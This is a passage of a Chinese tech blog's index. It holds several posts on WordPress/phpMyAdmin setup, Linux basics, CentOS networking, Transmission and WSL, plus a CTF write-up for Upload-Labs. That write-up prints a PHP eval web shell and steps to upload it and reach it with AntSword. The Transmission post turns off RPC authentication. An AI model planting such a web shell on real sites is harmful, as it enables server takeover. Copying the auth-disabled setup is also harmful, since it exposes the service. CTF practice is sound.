class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></tbody></table></figure><ol start="9"><li>重启 HTTP 服务器：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart httpd/nginx</span><br></pre></td></tr></tbody></table></figure><p>至此，PMA 已经安装完成，并可以通过 HTTP 协议访问。请访问  <code>http://your_domain/pma</code> ，使用您的 MySQL 数据库账号和密码登录 PMA。</p><h3 id="pma"><a class="anchor" href="#pma">#</a> PMA</h3><p>在这里安装时并没有创建如虚拟主机这种配置文件，而是直接放在默认的网站目录里。下面安装 wordpress 我将会创建一个虚拟主机，来安装和使用 wordpress。</p><h2 id="安装wordpress"><a class="anchor" href="#安装wordpress">#</a> 安装 wordpress</h2><p>WordPress 是一款流行的开源博客系统，它基于 PHP 和 MySQL 构建，具有简单易用、灵活可扩展等优点，是搭建个人博客、企业网站等的不二之选。</p><p>我将详细介绍如何安装 wordpress。</p><h3 id="创建虚拟网站"><a class="anchor" href="#创建虚拟网站">#</a> 创建虚拟网站</h3><p>为了避免 html 下文件之间的互相影响，可以选择创建虚拟网站来将他们隔开。</p><h4 id="apache方法"><a class="anchor" href="#apache方法">#</a> Apache 方法</h4><p>首先，需要在 Apache 的配置文件中创建一个虚拟主机。假设我们要为 WordPress 创建一个名为  <code>example.com</code>  的虚拟主机，可以按照以下步骤进行配置：</p><ol><li>创建一个新的配置文件  <code>/etc/httpd/conf.d/example.com.conf</code> ，并添加以下内容：</li></ol><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerName</span> example.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> /var/www/wp</span><br><span class="line"></span><br><span class="line">    <span class="section">&lt;Directory /var/www/wp&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> Indexes FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="section">&lt;FilesMatch \.php$&gt;</span></span><br><span class="line">        <span class="attribute">SetHandler</span> <span class="string">"proxy:fcgi://127.0.0.1:9000"</span></span><br><span class="line">    <span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>上述配置文件中， <code>ServerName</code>  指定了虚拟主机的域名， <code>DocumentRoot</code>  指定了虚拟主机的根目录， <code>&lt;Directory&gt;</code>  定义了虚拟主机的访问控制和索引文件等配置， <code>&lt;FilesMatch&gt;</code>  则用于匹配 PHP 脚本的 URL，并使用 FastCGI 处理 PHP 脚本。需要将其中的  <code>/var/www/example.com</code>  替换为实际的 WordPress 根目录。</p><ol start="2"><li>在  <code>/etc/hosts</code>  文件中添加虚拟主机的 IP 地址和域名的映射关系：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 example.com</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>重启 Apache 服务：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></tbody></table></figure><p>需要注意的是，如果需要使用 SSL 证书，还需要进行 SSL 相关的配置，并将虚拟主机的端口从 80 改为 443。</p><h4 id="nginx方式"><a class="anchor" href="#nginx方式">#</a> nginx 方式</h4><p>与 Apache 类似，需要在 Nginx 的配置文件中创建一个虚拟主机。假设我们要为 WordPress 创建一个名为  <code>example.com</code>  的虚拟主机，可以按照以下步骤进行配置：</p><ol><li>创建一个新的配置文件  <code>/etc/nginx/conf.d/example.com.conf</code> ，并添加以下内容：</li></ol><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> {</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / {</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?<span class="variable">$args</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> {</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/var/run/php-fpm/php-fpm.sock;</span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上述配置文件中， <code>listen</code>  指定了虚拟主机监听的端口， <code>server_name</code>  指定了虚拟主机的域名， <code>root</code>  指定了虚拟主机的根目录， <code>location /</code>  用于定义 URL 的匹配规则和相应的处理方式， <code>location ~ \.php$</code>  则用于匹配 PHP 脚本的 URL，并使用 FastCGI 处理 PHP 脚本。需要将其中的  <code>/var/www/example.com</code>  替换为实际的 WordPress 根目录。</p><ol start="2"><li>在  <code>/etc/hosts</code>  文件中添加虚拟主机的 IP 地址和域名的映射关系：</li></ol><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> example.<span class="keyword">com</span></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>重启 Nginx 服务：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></tbody></table></figure><p>和 apache 相同，如果需要使用 SSL 证书，还需要进行 SSL 相关的配置，并将虚拟主机的端口从 80 改为 443。</p><h3 id="安装"><a class="anchor" href="#安装">#</a> 安装</h3><ol><li>创建 MySQL 数据库和用户</li></ol><p>登录 MySQL 控制台，并创建一个新的数据库和用户：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE DATABASE wordpress_db;</span><br><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON wordpress_db.* TO <span class="string">'wordpress_user'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'password'</span>;</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt; EXIT;</span><br></pre></td></tr></tbody></table></figure><p>其中，'wordpress_db' 是要创建的数据库名，'wordpress_user' 是要创建的数据库用户，'password' 是要设置的数据库密码。需要将这些参数替换为自己的实际值。</p><ol start="2"><li>下载和解压 WordPress</li></ol><p>从 WordPress 官网下载最新的 WordPress 压缩包，并解压到 Apache 的 Web 根目录下，例如  <code>/var/www/html/</code> ：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget https://wordpress.org/latest.tar.gz</span><br><span class="line">tar -zxvf latest.tar.gz</span><br><span class="line">sudo <span class="built_in">cp</span> -r wordpress/* /var/www/html/</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>配置 WordPress</li></ol><p>重命名配置文件：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="built_in">cp</span> wp-config-sample.php wp-config.php</span><br></pre></td></tr></tbody></table></figure><p>编辑  <code>wp-config.php</code>  文件，并根据之前创建的数据库和用户设置以下参数：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">'DB_NAME'</span>, <span class="string">'wordpress_db'</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">'DB_USER'</span>, <span class="string">'wordpress_user'</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">'DB_PASSWORD'</span>, <span class="string">'password'</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br></pre></td></tr></tbody></table></figure><p>其中，'wordpress_db' 是之前创建的数据库名，'wordpress_user' 是之前创建的数据库用户，'password' 是之前设置的数据库密码。</p><ol start="4"><li>设置文件权限</li></ol><p>修改 WordPress 文件的权限，以使得 Apache 可以对其进行读写：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> -R apache:apache /var/www/html/</span><br><span class="line"><span class="built_in">chmod</span> -R 755 /var/www/html/</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>启动 Apache 和 MySQL</li></ol><p>启动 Apache 和 MySQL 服务，并设置开机自启：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd</span><br><span class="line">systemctl start mariadb</span><br><span class="line">systemctl <span class="built_in">enable</span> httpd</span><br><span class="line">systemctl <span class="built_in">enable</span> mariadb</span><br></pre></td></tr></tbody></table></figure><ol start="6"><li>访问 WordPress</li></ol><p>现在，我们可以通过浏览器访问 WordPress，输入服务器 IP 地址或域名，即可开始 WordPress 的安装过程。按照提示，设置网站名称、管理员账号和密码等信息，然后点击 “安装 WordPress” 按钮，即可完成 WordPress 的安装。</p><p>需要注意的是，为了保障网站的安全性，我们需要在 WordPress 安装完成后进行一些安全性方面的设置，例如加强访问控制、配置 SSL 证书、定期更新 WordPress 和插件等等。另外，我们也可以根据需要安装并配置一些 WordPress 插件，以扩展 WordPress 的功能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> centos </tag>
            
            <tag> web </tag>
            
            <tag> nginx </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF：Upload-Labs-Linux</title>
      <link href="/linux/fileupload/085248/"/>
      <url>/linux/fileupload/085248/</url>
      
        <content type="html"><![CDATA[<h1 id="题目预览"><a class="anchor" href="#题目预览">#</a> 题目预览：</h1><div class="tag-plugin image"><div class="image-bg"><img src="/img/Upload-Labs-Linux/20221010085420.png" fancybox="true"></div></div>  <h1 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h1><ol><li>开控制台</li><li>关闭 javascript<blockquote><p>设置 - 偏好设置 - 调试程序<br>删除 <code>onsubmit="return.checkFile()"</code></p></blockquote></li><li>新建一个文件里面写入 <code>&lt;?php @eval($_POST['123']);?&gt;</code></li><li>后缀名改为 php 上传到网站，显示出图片后右键复制链接。</li><li>打开 antsword，add 一个 url 地址为图片链接，密码为 123，加密 base64.</li><li>点击链接就能发现根目录有个 flag 文件了。</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> fileupload </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> buuctf </tag>
            
            <tag> antsword </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxlearn2</title>
      <link href="/ug/082833/"/>
      <url>/ug/082833/</url>
      
        <content type="html"><![CDATA[<hr><p>title: linuxlearn2<br>date: 2022-10-18 11:16:47<br>tags:</p><ul><li>diff</li><li>sudoers</li><li>passwd</li><li>usermod</li><li>linux</li></ul><hr><ul><li>diff 命令<br> diff 参数 文件 1 文件 2 &gt; 新文件</li></ul><p>netstat -ano | grep "80"</p><ul><li><p>sudoers<br>% 开头表示用户组<br>权限:<br>/sbin:<br> 该目录下的命令通常只有管理员才可以运行<br> /bin：<br>下的命令管理员和一般的用户都可以使用。<br>/usr/sbin：<br>这个目录表示系统命令的位置<br> /usr/bin:<br> 存放一些用户命令，如 led (控制 LED 灯的)。</p></li><li><p>passwd<br> 创建用户权限<br> /etc/passwd<br> 用户名：口令：用户标识号：组标识号：注释性描述：主目录：登录 Shell<br>useradd -u uid</p></li><li><p>usermod &amp; groupmod<br>// 修改用户所属组<br> usermod -g 用户组 用户名<br> // 修改用户 ID<br>usermod -u UID 用户名<br> // 修改组 ID<br>usermod -g GID 组名</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux入门学习0</title>
      <link href="/ug/175233/"/>
      <url>/ug/175233/</url>
      
        <content type="html"><![CDATA[<h1 id="linux系统目录结构"><a class="anchor" href="#linux系统目录结构">#</a> linux 系统目录结构</h1><blockquote><p>在 linux 中，所有都是以文件的形式存储和管理的。</p></blockquote><h2 id="bin"><a class="anchor" href="#bin">#</a> /bin</h2><blockquote><p>Binary 存放经常使用的命令。</p></blockquote><h2 id="sbin"><a class="anchor" href="#sbin">#</a> /sbin</h2><blockquote><p>super Binary 超级用户命令存放的目录。</p></blockquote><h2 id="home"><a class="anchor" href="#home">#</a> /home</h2><blockquote><p>用户目录</p></blockquote><h2 id="root"><a class="anchor" href="#root">#</a> /root</h2><blockquote><p>系统管理员目录</p></blockquote><h2 id="etc"><a class="anchor" href="#etc">#</a> /etc</h2><blockquote><p>管理系统配置文件</p></blockquote><h2 id="usr"><a class="anchor" href="#usr">#</a> /usr</h2><blockquote><p>类似于 windows 下 Programfiles 目录，</p></blockquote><h2 id="boot"><a class="anchor" href="#boot">#</a> /boot</h2><blockquote><p>启动所使用的核心文件都会存放在这里。</p></blockquote><h2 id="proc"><a class="anchor" href="#proc">#</a> /proc</h2><blockquote><p>内存映射</p></blockquote><h2 id="srv"><a class="anchor" href="#srv">#</a> /srv</h2><blockquote><p>services 的缩写，用于存放服务启动所需要的数据</p></blockquote><h2 id="sys"><a class="anchor" href="#sys">#</a> /sys</h2><blockquote><p>系统文件</p></blockquote><h2 id="tmp"><a class="anchor" href="#tmp">#</a> /tmp</h2><blockquote><p>是 temporary (临时) 的缩写，存放临时 / 缓存文件，可当作回收站使用。</p></blockquote><h2 id="dev"><a class="anchor" href="#dev">#</a> /dev</h2><blockquote><p>device 的缩写，类似于 windows 的设备管理器。</p></blockquote><h2 id="mnt"><a class="anchor" href="#mnt">#</a> /mnt</h2><blockquote><p>linux 用于挂载可移动设备（临时）的目录。</p></blockquote><h2 id="opt"><a class="anchor" href="#opt">#</a> /opt</h2><blockquote><p>主机额外安装的软件存放的目录</p></blockquote><h2 id="var"><a class="anchor" href="#var">#</a> /var</h2><blockquote><p>存放经常被修改的目录或文件，比如日志（*.log）。</p></blockquote><h2 id="lib"><a class="anchor" href="#lib">#</a> /lib</h2><blockquote><p>存放系统基本的动态链接库。</p></blockquote><h1 id="权限数字意思详解"><a class="anchor" href="#权限数字意思详解">#</a> 权限数字意思详解</h1><p>我们首先打开控制台在任意位置输入 ll, 就能看到当前文件夹下所有类型的信息。我们只取其中的前十位来进行结束.</p><blockquote><p>dr-xr-xr-x.</p></blockquote><h2 id="第一位"><a class="anchor" href="#第一位">#</a> 第一位</h2><blockquote><p>第一位表示类型</p></blockquote><ul><li>d directory 表示目录</li><li>b block 块文件</li><li>c char 字符文件</li><li>- file 普通文件</li><li>l link 链接</li><li>etc.</li></ul><h2 id="后面九位"><a class="anchor" href="#后面九位">#</a> 后面九位</h2><blockquote><p>后面九位表示了文件的类型，对应的位置如果是 <code>-</code>  则表示没有对应的权限.</p></blockquote><table>    <tbody><tr><th>        </th><td colspan="3">前三位</td>        <td colspan="3">中间三位</td>        <td colspan="3">后三位</td>        </tr><tr align="center">        <td colspan="3">创建者</td>        <td colspan="3">同组用户</td>        <td colspan="3">其他用户</td>    </tr>    <tr align="center">        <td>r</td>        <td>w</td>        <td>x</td>        <td>r</td>        <td>w</td>        <td>x</td>        <td>r</td>        <td>w</td>        <td>x</td>    </tr>    <tr align="center">        <td>读</td>        <td>写</td>        <td>执行</td>        <td>读</td>        <td>写</td>        <td>执行</td>        <td>读</td>        <td>写</td>        <td>执行</td>    </tr></tbody></table><p>下面来看一个实例:</p><p>如果一个文件的权限为 755, 则代表什么意思？</p><p>我们只需要把 755 按位转换为二进制，对应位为 0 则表示没有这个权限.</p><table><thead><tr><th>7</th><th>5</th><th>5</th></tr></thead><tbody><tr><td>111</td><td>101</td><td>101</td></tr></tbody></table><p>用人的语言表述:</p><blockquote><p>对于创建者：可以读取，可以更改，可以执行.<br> 对于同组人员：可以读取，不能更改，可以执行.<br> 对于其他成员：可以读取，不能更改，可以执行.</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 目录 </tag>
            
            <tag> 指令 </tag>
            
            <tag> 权限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决windows资源管理器无法自动刷新等问题</title>
      <link href="/ug/164658/"/>
      <url>/ug/164658/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有时候在使用资源管理器新建文件的时候发现无法自动刷新，每次都需要手动刷新才会出现。这同样也导致了 chrome 在保存文件时会卡住一段时间。</p></blockquote><h1 id="solution"><a class="anchor" href="#solution">#</a> Solution</h1><p>其实解决方法很简单，关掉你映射的所有网络驱动器即可恢复。据说这是 windows 的一个 bug，取消掉网络驱动器映射便解决了这个问题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> win </tag>
            
            <tag> explorer.exe </tag>
            
            <tag> autorefresh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmware安装好后配置centos网络</title>
      <link href="/ug/222828/"/>
      <url>/ug/222828/</url>
      
        <content type="html"><![CDATA[<h1 id="更改-ifcfg-ens33-文件"><a class="anchor" href="#更改-ifcfg-ens33-文件">#</a> 更改 ifcfg-ens33 文件</h1><blockquote><p>编辑配置文件</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></tbody></table></figure><blockquote><p>需要添加 / 修改的地方</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOTPROTO=static</span><br><span class="line">ONBOOT=<span class="built_in">yes</span></span><br><span class="line">IPADDR=192.168.xx.xx</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.204.2</span><br><span class="line">DNS1=8.8.8.8</span><br><span class="line">DNS2=114.114.114.114</span><br></pre></td></tr></tbody></table></figure><h1 id="编辑-resolvconf-文件"><a class="anchor" href="#编辑-resolvconf-文件">#</a> 编辑 resolv.conf 文件</h1><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/resolv.conf</span><br></pre></td></tr></tbody></table></figure><blockquote><p>添加如下内容</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by NetworkManager</span></span><br><span class="line">search localdomain</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></tbody></table></figure><h1 id="重启网卡"><a class="anchor" href="#重启网卡">#</a> 重启网卡</h1><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> centos </tag>
            
            <tag> network </tag>
            
            <tag> vmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在你的 linux nas 上安装一个种子下载器吧！</title>
      <link href="/ug/002853/"/>
      <url>/ug/002853/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="anchor" href="#intro">#</a> Intro</h1><p>Transmission 是一款流行的 BT 下载软件，比其他客户端使用更少的资源，守护程序非常适合服务器，并且可以通过桌面 GUI、Web 界面和终端程序进行远程控制，支持本地对等发现、完全加密、DHT、µTP、PEX 和 Magnet Link 等。</p><h1 id="安装"><a class="anchor" href="#安装">#</a> 安装</h1><p>这有啥好说的，直接 apt 一把梭：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install transmission-daemon</span><br></pre></td></tr></tbody></table></figure><p>不过在更改配置前，建议先关一下服务，以防万一：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop transmission-daemon</span><br></pre></td></tr></tbody></table></figure><h1 id="配置"><a class="anchor" href="#配置">#</a> 配置</h1><ol><li>transmission 的配置文件在  <code>/etc/transmission-daemon/settings.json</code></li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/transmission-daemon/settings.json</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>主要需要看看下面这几项：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"download-dir"</span>: <span class="string">"/home/pi/complete"</span>, <span class="comment"># 下载目录 </span></span><br><span class="line"><span class="string">"incomplete-dir"</span>: <span class="string">"/home/pi/incomplete"</span>, <span class="comment"># 下载未完成文件目录</span></span><br><span class="line"><span class="string">"rpc-authentication-required"</span>: <span class="literal">false</span>, <span class="comment"># 懒得配置密码直接把验证关掉。</span></span><br><span class="line"><span class="string">"rpc-host-whitelist-enabled"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"rpc-port"</span>: 9091, <span class="comment"># 默认 Web 访问端口，这个可以根据需要修改一下。</span></span><br><span class="line"><span class="string">"rpc-whitelist-enabled"</span>: <span class="literal">false</span>, <span class="comment"># 白名单开关</span></span><br><span class="line"><span class="string">"utp-enabled"</span>: <span class="literal">true</span> <span class="comment"># 允许 Web 登录</span></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>修改完成后启动 daemon：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start transmission-daemon</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>浏览器打开 127.0.0.1:9091 查看效果：</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="/img/transmission/20220920213841.png" fancybox="true"></div></div>  <h1 id="安装第三方主题"><a class="anchor" href="#安装第三方主题">#</a> 安装第三方主题</h1><p>下载并执行 TWC 中文界面安装脚本</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/ronggang/transmission-web-control/raw/master/release/install-tr-control-cn.sh</span><br><span class="line">bash install-tr-control-cn.sh</span><br></pre></td></tr></tbody></table></figure><p>按 数字 1 然后回车安装。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt; <span class="string">2022-08-29 00:27:53 &gt;&gt; 安装脚本执行完成。如遇到问题请查看：https://github.com/ronggang/transmission-web-control/wiki</span></span><br><span class="line"><span class="string">&lt;&lt; 2022</span>-08-29 00:27:53 &gt;&gt; == 结束 ==</span><br></pre></td></tr></tbody></table></figure><p>弹出如上提示则安装成功，返回 web 界面刷新即可。</p><div class="tag-plugin image"><div class="image-bg"><img src="/img/transmission/20220920213753.png" fancybox="true"></div></div>]]></content>
      
      
      
        <tags>
            
            <tag> transmission </tag>
            
            <tag> torrent </tag>
            
            <tag> 下载器 </tag>
            
            <tag> nas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Windows直接访问WSL2路径并直接进行读写操作,权限不足的问题</title>
      <link href="/ug/234236/"/>
      <url>/ug/234236/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="anchor" href="#intro">#</a> Intro</h1><p>初次安装 WSL Ubuntu 时，一般都会设置默认登录用户，当你通过 windows 访问该文件夹时，如果访问的 Ubuntu 目录的权限用户时你的默认用户，你可以对其进行修改。但是如果你访问的时 root 权限的用户，则会出现如权限不足，permission deny 报错。</p><h1 id="solution"><a class="anchor" href="#solution">#</a> Solution</h1><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\wangj\AppData\Local\Microsoft\WindowsApps\debian.exe config --default-user root</span><br></pre></td></tr></tbody></table></figure><p>修改完成后，记得重启 wsl：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></tbody></table></figure><p>10s 后，在执行 wsl 命令，然后再次测试，看是否可行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> wsl </tag>
            
            <tag> 权限不足 </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署完hexo后还应该准备哪些工作</title>
      <link href="/Hexo/222543/"/>
      <url>/Hexo/222543/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="anchor" href="#intro">#</a> Intro</h1><p>上一回我们讲到了如何部署 hexo 到 github 上，并简单的向 repo 里推送了你的博客。这一回我们简单的来完善你的博客。</p><h1 id="0主题配置"><a class="anchor" href="#0主题配置">#</a> 0. 主题配置</h1><ul><li>old:<br><a href="https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/" title="Click Me">shoka</a><br><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md" title="matery">matery</a></li><li>new<br><a href="https://xaoxuu.com/wiki/stellar/#start" title="stellar">stellar</a><br><a href="https://volantis.js.org/v6/getting-started/" title="volantis">volantis</a></li></ul><h1 id="1备份hexo源文件到-backup-分支"><a class="anchor" href="#1备份hexo源文件到-backup-分支">#</a> 1. 备份 Hexo 源文件到 Backup 分支</h1><p>由于种种原因我们总会更改自己的工作环境或者一顿操作猛如虎，将自己博客的源文件一通收拾，然后就没有然后了。<br>所以建议大家创建好博客记得把源文件也一同备份到 Github 上以防万一。</p><h2 id="创建backup分支"><a class="anchor" href="#创建backup分支">#</a> 创建 backup 分支</h2><ol><li>打开你 GitHub repo 的页面，点击左上角的分支选项。</li><li>点击 View all branches，然后点击右上角的 New branch。</li><li>Branch name：backup，Branch source：master</li><li>create branch。</li></ol><h2 id="将backup分支切换为默认分支"><a class="anchor" href="#将backup分支切换为默认分支">#</a> 将 backup 分支切换为默认分支</h2><blockquote><p>我也不知道为什么要这么做，但是不这么做最后一步就没法 push 了 😦</p></blockquote><h2 id="将repo-clone到本地"><a class="anchor" href="#将repo-clone到本地">#</a> 将 repo clone 到本地</h2><ol><li>直接在博客根目录下执行这个命令：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> <span class="string">'你的repo'</span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>将克隆过来 repo 里的 <code>.git</code>  文件夹拷贝到博客根目录。</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r ./<span class="string">'你的repo'</span> ./</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>依次执行以下指令</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 